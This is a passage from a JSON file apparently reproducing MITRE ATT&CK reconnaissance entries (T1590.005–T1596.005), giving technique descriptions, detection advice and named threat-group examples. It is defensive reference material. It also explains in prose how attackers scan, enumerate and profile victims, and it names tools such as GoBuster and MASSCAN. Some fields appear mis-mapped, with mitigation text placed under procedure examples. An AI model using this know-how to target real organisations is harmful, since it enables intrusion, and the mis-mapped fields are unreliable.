    "Description": "Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex:Search Open Technical Databases).[1][2][3]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote Services).",
    "Detects": [],
    "Procedure Examples": [
      "Andarielhas limited its watering hole attacks to specific IP address ranges.[4]",
      "HAFNIUMhas obtained IP addresses for publicly-accessible Exchange servers.[5]",
      "Magic Houndhas captured the IP addresses of visitors to their phishing sites.[6]"
    ]
  },
  "T1590.006": {
    "Name": "Gather Victim Network Information:Network Security Appliances",
    "Description": "Adversaries may gather information about the victim's network security appliances that can be used during targeting. Information about network security appliances may include a variety of details, such as the existence and specifics of deployed firewalls, content filters, and proxies/bastion hosts. Adversaries may also target information about victim network-based intrusion detection systems (NIDS) or other appliances related to defensive cybersecurity operations.Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information.[1]Information about network security appliances may also be exposed to adversaries via online or other accessible data sets (ex:Search Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Technical DatabasesorSearch Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote Services).",
    "Detects": [],
    "Procedure Examples": [
      "Volt Typhoonhas identified target network security measures as part of pre-compromise reconnaissance.[2]"
    ]
  },
  "T1591": {
    "Name": "Gather Victim Org Information",
    "Description": "Adversaries may gather information about the victim's organization that can be used during targeting. Information about an organization may include a variety of details, including the names of divisions/departments, specifics of business operations, as well as the roles and responsibilities of key employees.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about an organization may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1][2]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:PhishingorTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "APT28has used large language models (LLMs) to gather information about satellite capabilities.[3][4]",
      "Kimsukyhas collected victim organization information including but not limited to organization hierarchy, functions, press releases, and others.[5]Kimsukyhas also used large language models (LLMs) to gather information about potential targets of interest.[3]",
      "Lazarus Grouphas studied publicly available information about a targeted organization to tailor spearphishing efforts against specific departments and/or individuals.[6]",
      "Moonstone Sleethas gathered information on victim organizations through email and social media interaction.[7]",
      "ForOperation Dream Job,Lazarus Groupgathered victim organization information to identify specific targets.[8]",
      "Volt Typhoonhas conducted extensive reconnaissance pre-compromise to gain information about the targeted organization.[9]"
    ]
  },
  "T1591.001": {
    "Name": "Gather Victim Org Information:Determine Physical Locations",
    "Description": "Adversaries may gather the victim's physical location(s) that can be used during targeting. Information about physical locations of a target organization may include a variety of details, including where key resources and infrastructure are housed. Physical locations may also indicate what legal jurisdiction and/or authorities the victim operates within.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Physical locations of a target organization may also be exposed to adversaries via online or other accessible data sets (ex:Search Victim-Owned WebsitesorSocial Media).[1][2]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:PhishingorHardware Additions).",
    "Detects": [],
    "Procedure Examples": [
      "Magic Houndhas collected location information from visitors to their phishing sites.[3]"
    ]
  },
  "T1591.002": {
    "Name": "Gather Victim Org Information:Business Relationships",
    "Description": "Adversaries may gather information about the victim's business relationships that can be used during targeting. Information about an organization’s business relationships may include a variety of details, including second or third-party organizations/domains (ex: managed service providers, contractors, etc.) that have connected (and potentially elevated) network access. This information may also reveal supply chains and shipment paths for the victim’s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about business relationships may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Supply Chain Compromise,Drive-by Compromise, orTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "Dragonflyhas collected open source information to identify relationships between organizations for targeting purposes.[2]",
      "LAPSUS$has gathered detailed knowledge of an organization's supply chain relationships.[3]",
      "In preparation for its attack against the 2018 Winter Olympics,Sandworm Teamconducted online research of partner organizations listed on an official PyeongChang Olympics partnership site.[4]"
    ]
  },
  "T1591.003": {
    "Name": "Gather Victim Org Information:Identify Business Tempo",
    "Description": "Adversaries may gather information about the victim's business tempo that can be used during targeting. Information about an organization’s business tempo may include a variety of details, including operational hours/days of the week. This information may also reveal times/dates of purchases and shipments of the victim’s hardware and software resources.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about business tempo may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Supply Chain CompromiseorTrusted Relationship)",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1591.004": {
    "Name": "Gather Victim Org Information:Identify Roles",
    "Description": "Adversaries may gather information about identities and roles within the victim organization that can be used during targeting. Information about business roles may reveal a variety of targetable details, including identifiable information for key personnel as well as what data/resources they have access to.Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about business roles may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Phishing).",
    "Detects": [],
    "Procedure Examples": [
      "HEXANEhas identified executives, HR, and IT staff at victim organizations for further targeting.[2][3]",
      "LAPSUS$has gathered detailed knowledge of team structures within a target organization.[4]",
      "DuringOperation Dream Job,Lazarus Grouptargeted specific individuals within an organization with tailored job vacancy announcements.[5][6]",
      "Volt Typhoonhas identified key network and IT staff members pre-compromise at targeted organizations.[7]"
    ]
  },
  "T1592": {
    "Name": "Gather Victim Host Information",
    "Description": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).Adversaries may gather this information in various ways, such as direct collection actions viaActive ScanningorPhishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1]Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex:Social MediaorSearch Victim-Owned Websites). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Supply Chain CompromiseorExternal Remote Services).Adversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.[2]",
    "Detects": [
      "Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors.[4][1]Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    ],
    "Procedure Examples": [
      "Volt Typhoonhas conducted pre-compromise reconnaissance for victim host information.[3]"
    ]
  },
  "T1592.001": {
    "Name": "Gather Victim Host Information:Hardware",
    "Description": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).Adversaries may gather this information in various ways, such as direct collection actions viaActive Scanning(ex: hostnames, server banners, user agent strings) orPhishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1]Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Compromise Hardware Supply ChainorHardware Additions).",
    "Detects": [
      "Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors.[2][1]Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    ],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1592.002": {
    "Name": "Gather Victim Host Information:Software",
    "Description": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).Adversaries may gather this information in various ways, such as direct collection actions viaActive Scanning(ex: listening ports, server banners, user agent strings) orPhishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1]Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or for initial access (ex:Supply Chain CompromiseorExternal Remote Services).",
    "Detects": [
      "Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors.[5][1]Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    ],
    "Procedure Examples": [
      "Andarielhas inserted a malicious script within compromised websites to collect potential victim information such as browser type, system language, Flash Player version, and other data.[2]",
      "Magic Houndhas captured the user-agent strings from visitors to their phishing sites.[3]",
      "Sandworm Teamhas researched software code to enable supply-chain operations, most notably for the 2017NotPetyaattack.Sandworm Teamalso collected a list of computers using specific software as part of its targeting efforts.[4]"
    ]
  },
  "T1592.003": {
    "Name": "Gather Victim Host Information:Firmware",
    "Description": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).Adversaries may gather this information in various ways, such as direct elicitation viaPhishing for Information. Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).[1]Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Supply Chain CompromiseorExploit Public-Facing Application).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1592.004": {
    "Name": "Gather Victim Host Information:Client Configurations",
    "Description": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.Adversaries may gather this information in various ways, such as direct collection actions viaActive Scanning(ex: listening ports, server banners, user agent strings) orPhishing for Information. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.[1]Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Supply Chain CompromiseorExternal Remote Services).",
    "Detects": [
      "Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors.[3][1]Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access."
    ],
    "Procedure Examples": [
      "HAFNIUMhas interacted with Office 365 tenants to gather details regarding target's environments.[2]"
    ]
  },
  "T1593": {
    "Name": "Search Open Websites/Domains",
    "Description": "Adversaries may search freely available websites and/or domains for information about victims that can be used during targeting. Information about victims may be available in various online sites, such as social media, new sites, or those hosting information about business operations such as hiring or requested/rewarded contracts.[1][2][3]Adversaries may search in different online sites depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Technical Databases), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:External Remote ServicesorPhishing).",
    "Detects": [],
    "Procedure Examples": [
      "Kimsukyhas used LLMs to identify think tanks, government organizations, etc. that have information.[4]",
      "Sandworm Teamresearched Ukraine's unique legal entity identifier (called an \"EDRPOU\" number), including running queries on the EDRPOU website, in preparation for theNotPetyaattack.Sandworm Teamhas also researched third-party websites to help it craft credible spearphishing emails.[5]",
      "Star Blizzardhas used open-source research to identify information about victims to use in targeting.[6][7]",
      "Volt Typhoonhas conducted pre-compromise web searches for victim information.[8]"
    ]
  },
  "T1593.001": {
    "Name": "Search Open Websites/Domains:Social Media",
    "Description": "Adversaries may search social media for information about victims that can be used during targeting. Social media sites may contain various information about a victim organization, such as business announcements as well as information about the roles, locations, and interests of staff.Adversaries may search in different social media sites depending on what information they seek to gather. Threat actors may passively harvest data from these sites, as well as use information gathered to create fake profiles/groups to elicit victim’s into revealing specific information (i.e.Spearphishing Service).[1]Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Technical Databases), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Spearphishing via Service).",
    "Detects": [],
    "Procedure Examples": [
      "EXOTIC LILYhas copied data from social media sites to impersonate targeted individuals.[2]",
      "Kimsukyhas used Twitter to monitor potential victims and to prepare targeted phishing e-mails.[3]",
      "ForOperation Dream Job,Lazarus Groupused LinkedIn to identify and target employees within a chosen organization.[4]"
    ]
  },
  "T1593.002": {
    "Name": "Search Open Websites/Domains:Search Engines",
    "Description": "Adversaries may use search engines to collect information about victims that can be used during targeting. Search engine services typical crawl online sites to index context and may provide users with specialized syntax to search for specific keywords or specific types of content (i.e. filetypes).[1][2]Adversaries may craft various search engine queries depending on what information they seek to gather. Threat actors may use search engines to harvest general information about victims, as well as use specialized queries to look for spillages/leaks of sensitive information such as network details or credentials. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Technical Databases), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Valid AccountsorPhishing).",
    "Detects": [],
    "Procedure Examples": [
      "APT41 DUSTinvolved use of search engines to research victim servers.[3]",
      "Kimsukyhas searched for vulnerabilities, tools, and geopolitical trends on Google to target victims.[4]"
    ]
  },
  "T1593.003": {
    "Name": "Search Open Websites/Domains:Code Repositories",
    "Description": "Adversaries may search public code repositories for information about victims that can be used during targeting. Victims may store code in repositories on various third-party websites such as GitHub, GitLab, SourceForge, and BitBucket. Users typically interact with code repositories through a web application or command-line utilities such as git.Adversaries may search various public code repositories for various information about a victim. Public code repositories can often be a source of various general information about victims, such as commonly used programming languages and libraries as well as the names of employees. Adversaries may also identify more sensitive data, including accidentally leaked credentials or API keys.[1]Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for Information), establishing operational resources (ex:Compromise AccountsorCompromise Infrastructure), and/or initial access (ex:Valid AccountsorPhishing).Note:This is distinct fromCode Repositories, which focuses onCollectionfrom private and internally hosted code repositories.",
    "Detects": [],
    "Procedure Examples": [
      "HAFNIUMhas discovered leaked corporate credentials on public repositories including GitHub.[2]",
      "LAPSUS$has searched public code repositories for exposed credentials.[3]"
    ]
  },
  "T1594": {
    "Name": "Search Victim-Owned Websites",
    "Description": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex:Email Addresses). These sites may also have details highlighting business operations and relationships.[1]Adversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Technical Databases), establishing operational resources (ex:Establish AccountsorCompromise Accounts), and/or initial access (ex:Trusted RelationshiporPhishing).In addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such asWordlist Scanning, as well as by leveraging files such as sitemap.xml and robots.txt.[2][3]",
    "Detects": [
      "Monitor for suspicious network traffic that could be indicative of adversary reconnaissance, such as rapid successions of requests indicative of web crawling and/or large quantities of requests originating from a single source (especially if the source is known to be associated with an adversary). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields."
    ],
    "Procedure Examples": [
      "APT41 DUSTinvolved access of external victim websites for target development.[4]",
      "DuringCutting Edge, threat actors peformed reconnaissance of victims' internal websites via proxied connections.[5]",
      "EXOTIC LILYhas used contact forms on victim websites to generate phishing e-mails.[6]",
      "Kimsukyhas searched for information on the target company's website.[7]",
      "Leviathanenumerated compromised web application resources to identify additional endpoints and resources linkd to the website for follow-on access duringLeviathan Australian Intrusions.[8]",
      "Sandworm Teamhas conducted research against potential victim websites as part of its operational planning.[9]",
      "Silent Librarianhas searched victim's websites to identify the interests and academic areas of targeted individuals and to scrape source code, branding, and organizational contact information for phishing pages.[10][11][12]",
      "TA578has filled out contact forms on victims' websites to direct them to adversary-controlled URLs.[13]",
      "Volt Typhoonhas conducted pre-compromise reconnaissance on victim-owned sites.[14]"
    ]
  },
  "T1595": {
    "Name": "Active Scanning",
    "Description": "Adversaries may execute active reconnaissance scans to gather information that can be used during targeting. Active scans are those where the adversary probes victim infrastructure via network traffic, as opposed to other forms of reconnaissance that do not involve direct interaction.Adversaries may perform different forms of active scanning depending on what information they seek to gather. These scans can also be performed in various ways, including using native features of network protocols such as ICMP.[1][2]Information from these scans may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote ServicesorExploit Public-Facing Application).",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "In theTriton Safety Instrumented System Attack,TEMP.Velesengaged in network reconnaissance against targets of interest.[3]"
    ]
  },
  "T1595.001": {
    "Name": "Active Scanning:Scanning IP Blocks",
    "Description": "Adversaries may scan victim IP blocks to gather information that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses.Adversaries may scan IP blocks in order toGather Victim Network Information, such as which IP addresses are actively in use as well as more detailed information about hosts assigned these addresses. Scans may range from simple pings (ICMP requests and responses) to more nuanced scans that may reveal host software/versions via server banners or other network artifacts.[1]Information from these scans may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote Services).",
    "Detects": [
      "Monitoring the content of network traffic can help detect patterns associated with active scanning activities. This can include identifying repeated connection attempts, unusual scanning behaviors, or probing activity targeting multiple IP addresses across a network.",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Ember Bearhas targeted IP ranges for vulnerability scanning related to government and critical infrastructure organizations.[2]",
      "TeamTNThas scanned specific lists of target IP addresses.[3]"
    ]
  },
  "T1595.002": {
    "Name": "Active Scanning:Vulnerability Scanning",
    "Description": "Adversaries may scan victims for vulnerabilities that can be used during targeting. Vulnerability scans typically check if the configuration of a target host/application (ex: software and version) potentially aligns with the target of a specific exploit the adversary may seek to use.These scans may also include more broad attempts toGather Victim Host Informationthat can be used to identify more commonly known, exploitable vulnerabilities. Vulnerability scans typically harvest running software and version numbers via server banners, listening ports, or other network artifacts.[1]Information from these scans may reveal opportunities for other forms of reconnaissance (ex:Search Open Websites/DomainsorSearch Open Technical Databases), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:Exploit Public-Facing Application).",
    "Detects": [
      "Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure). Consider correlation with process monitoring and command line to detect anomalous processes execution and command line arguments associated to traffic patterns (e.g. monitor anomalies in use of files that do not normally initiate connections for respective protocol(s)).",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "APT28has performed large-scale scans in an attempt to find vulnerable servers.[2]",
      "APT29has conducted widespread scanning of target environments to identify vulnerabilities for exploit.[3]",
      "APT41used the Acunetix SQL injection vulnerability scanner in target reconnaissance operations, as well as the JexBoss tool to identify vulnerabilities in Java applications.[4]",
      "Aquatic Pandahas used publicly accessible DNS logging services to identify servers vulnerable to Log4j (CVE 2021-44228).[5]",
      "DuringCutting Edge, threat actors used the publicly available Interactsh tool to identify Ivanti Connect Secure VPNs vulnerable to CVE-2024-21893.[6]",
      "Dragonflyhas scanned targeted systems for vulnerable Citrix and Microsoft Exchange services.[7]",
      "Earth Luscahas scanned for vulnerabilities in the public-facing servers of their targets.[8]",
      "Ember Bearhas used publicly available tools such as MASSCAN and Acunetix for vulnerability scanning of public-facing infrastructure.[9]",
      "Leviathanhas conducted reconnaissance against target networks of interest looking for vulnerable, end-of-life, or no longer maintainted devices against which to rapidly deploy exploits.[10]",
      "Magic Houndhas conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.[11][12]",
      "Sandworm Teamhas scanned network infrastructure for vulnerabilities as part of its operational planning.[13]",
      "TeamTNThas scanned for vulnerabilities in IoT devices and other related resources such as the Docker API.[14]",
      "Volatile Cedarhas performed vulnerability scans of the target server.[15][16]",
      "Winter Vivernhas used remotely-hosted instances of the Acunetix vulnerability scanner.[17]"
    ]
  },
  "T1595.003": {
    "Name": "Active Scanning:Wordlist Scanning",
    "Description": "Adversaries may iteratively probe infrastructure using brute-forcing and crawling techniques. While this technique employs similar methods toBrute Force, its goal is the identification of content and infrastructure rather than the discovery of valid credentials. Wordlists used in these scans may contain generic, commonly used names and file extensions or terms specific to a particular software. Adversaries may also create custom, target-specific wordlists using data gathered from other Reconnaissance techniques (ex:Gather Victim Org Information, orSearch Victim-Owned Websites).For example, adversaries may use web content discovery tools such as Dirb, DirBuster, and GoBuster and generic or custom wordlists to enumerate a website’s pages and directories.[1]This can help them to discover old, vulnerable pages or hidden administrative portals that could become the target of further operations (ex:Exploit Public-Facing ApplicationorBrute Force).As cloud storage solutions typically use globally unique names, adversaries may also use target-specific wordlists and tools such as s3recon and GCPBucketBrute to enumerate public and private buckets on cloud infrastructure.[2][3]Once storage objects are discovered, adversaries may leverageData from Cloud Storageto access valuable information that can be exfiltrated or used to escalate privileges and move laterally.",
    "Detects": [
      "Monitor for suspicious network traffic that could be indicative of scanning, such as large quantities originating from a single source (especially if the source is known to be associated with an adversary/botnet)."
    ],
    "Procedure Examples": [
      "APT41leverages various tools and frameworks to brute-force directories on web servers.[4]",
      "Volatile Cedarhas used DirBuster and GoBuster to brute force web directories and DNS subdomains.[1]"
    ]
  },
  "T1596": {
    "Name": "Search Open Technical Databases",
    "Description": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.[1][2][3][4][5][6][7]Adversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Phishing for InformationorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote ServicesorTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "APT28has used large language models (LLMs) to assist in script development and deployment.[8][9]",
      "Kimsukyhas used LLMs to better understand publicly reported vulnerabilities.[8][9]"
    ]
  },
  "T1596.001": {
    "Name": "Search Open Technical Databases:DNS/Passive DNS",
    "Description": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.Adversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).[1][2]Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Search Victim-Owned WebsitesorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote ServicesorTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1596.002": {
    "Name": "Search Open Technical Databases:WHOIS",
    "Description": "Adversaries may search public WHOIS data for information about victims that can be used during targeting. WHOIS data is stored by regional Internet registries (RIR) responsible for allocating and assigning Internet resources such as domain names. Anyone can query WHOIS servers for information about a registered domain, such as assigned IP blocks, contact information, and DNS nameservers.[1]Adversaries may search WHOIS data to gather actionable information. Threat actors can use online resources or command-line utilities to pillage through WHOIS data for information about potential victims. Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorPhishing for Information), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:External Remote ServicesorTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1596.003": {
    "Name": "Search Open Technical Databases:Digital Certificates",
    "Description": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.Adversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.[1]Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).[2]Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorPhishing for Information), establishing operational resources (ex:Develop CapabilitiesorObtain Capabilities), and/or initial access (ex:External Remote ServicesorTrusted Relationship).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1596.004": {
    "Name": "Search Open Technical Databases:CDNs",
    "Description": "Adversaries may search content delivery network (CDN) data about victims that can be used during targeting. CDNs allow an organization to host content from a distributed, load balanced array of servers. CDNs may also allow organizations to customize content delivery based on the requestor’s geographical region.Adversaries may search CDN data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about content servers within a CDN. Adversaries may also seek and target CDN misconfigurations that leak sensitive information not intended to be hosted and/or do not have the same protection mechanisms (ex: login portals) as the content hosted on the organization’s website.[1]Information from these sources may reveal opportunities for other forms of reconnaissance (ex:Active ScanningorSearch Open Websites/Domains), establishing operational resources (ex:Acquire InfrastructureorCompromise Infrastructure), and/or initial access (ex:Drive-by Compromise).",
    "Detects": [],
    "Procedure Examples": [
      "This technique cannot be easily mitigated with preventive controls since it is based on behaviors performed outside of the scope of enterprise defenses and controls. Efforts should focus on minimizing the amount and sensitivity of data available to external parties."
    ]
  },
  "T1596.005": {
    "Name": "Search Open Technical Databases:Scan Databases",
